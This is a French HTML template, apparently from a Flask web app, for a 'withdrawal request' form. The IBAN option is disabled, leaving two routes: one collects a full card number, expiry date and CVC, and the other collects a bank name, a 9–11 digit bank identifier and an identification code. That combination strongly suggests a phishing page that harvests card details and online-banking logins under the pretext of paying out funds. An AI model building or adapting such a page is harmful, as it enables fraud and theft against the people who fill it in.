<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Demande de retrait</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
</head>
<body>

<div class="container">
    <div class="form-card">
        <h2 class="form-title">Demande de retrait</h2>

        <form method="POST" action="/withdraw">

            <div class="form-group">
                <label for="withdraw_method">Méthode de retrait :</label>
                <select name="withdraw_method" id="withdraw_method" class="form-input" required>
                    <option value="" disabled selected>-- Sélectionnez une méthode --</option>
                    <option value="card">Carte bancaire</option>
                    <option value="iban" disabled>IBAN (Indisponible pour le moment)</option>
                    <option value="id_bank">Identification bancaire</option>
                </select>
                <small class="form-hint">Choisissez votre méthode de retrait.</small>
            </div>

            <!-- Carte bancaire -->
            <div id="card_section" class="form-section" style="display:none;">
                <div class="form-group">
                    <label for="card_number">Numéro de carte :</label>
                    <input type="text" name="card_number" id="card_number" class="form-input" placeholder="0000 0000 0000 0000" autocomplete="off">
                </div>
                <div class="form-group">
                    <label for="card_name">Nom sur la carte :</label>
                    <input type="text" name="card_name" id="card_name" class="form-input" placeholder="Nom tel qu'inscrit sur la carte" autocomplete="off">
                </div>
                <div class="form-group">
                    <label for="card_expiry">Date d'expiration :</label>
                    <input type="text" name="card_expiry" id="card_expiry" class="form-input" placeholder="MM/AA" autocomplete="off">
                </div>
                <div class="form-group">
                    <label for="card_cvc">Code CVC :</label>
                    <input type="text" name="card_cvv" id="card_cvc" class="form-input" placeholder="123" autocomplete="off">
                </div>
            </div>

            <!-- IBAN (désactivé) -->
            <div id="iban_section" class="form-section" style="display:none;">
                <div class="form-group">
                    <label for="iban">IBAN :</label>
                    <input type="text" name="iban" id="iban" class="form-input" disabled placeholder="Indisponible" autocomplete="off">
                </div>
                <div class="form-group">
                    <label for="bank_name">Nom de la banque :</label>
                    <input type="text" name="bank_name" id="bank_name" class="form-input" disabled placeholder="Indisponible" autocomplete="off">
                </div>
            </div>

            <!-- Identification bancaire -->
            <div id="id_section" class="form-section" style="display:none;">
                <div class="form-group">
                    <label for="bank_name_id">Nom de la banque :</label>
                    <input type="text" name="bank_name_id" id="bank_name_id" class="form-input" autocomplete="off">
                </div>
                <div class="form-group">
                    <label for="bank_identifiers">Identifiant bancaire (9 à 11 chiffres) :</label>
                    <input type="text" name="bank_identifiers" id="bank_identifiers" class="form-input" autocomplete="off">
                </div>
                <div class="form-group">
                    <label for="bank_code_id">Code d’identification :</label>
                    <input type="text" name="bank_code_id" id="bank_code_id" class="form-input" autocomplete="off">
                </div>
            </div>

            <button type="submit" class="btn-primary">Envoyer la demande</button>

            {% if message %}
                <div class="form-message {{ 'success' if success else 'error' }}">
                    {{ message }}
                </div>
            {% endif %}

        </form>
    </div>
</div>

<script>
    document.addEventListener('DOMContentLoaded', function () {
        const methodSelect = document.getElementById('withdraw_method');
        const cardSection = document.getElementById('card_section');
        const ibanSection = document.getElementById('iban_section');
        const idSection = document.getElementById('id_section');

        function hideAllSections() {
            cardSection.style.display = 'none';
            ibanSection.style.display = 'none';
            idSection.style.display = 'none';
        }

        methodSelect.addEventListener('change', function () {
            hideAllSections();
            const selected = methodSelect.value;

            if (selected === 'card') {
                cardSection.style.display = 'block';
            } else if (selected === 'iban') {
                ibanSection.style.display = 'block';
            } else if (selected === 'id_bank') {
                idSection.style.display = 'block';
            }
        });
    });
</script>

</body>
</html>
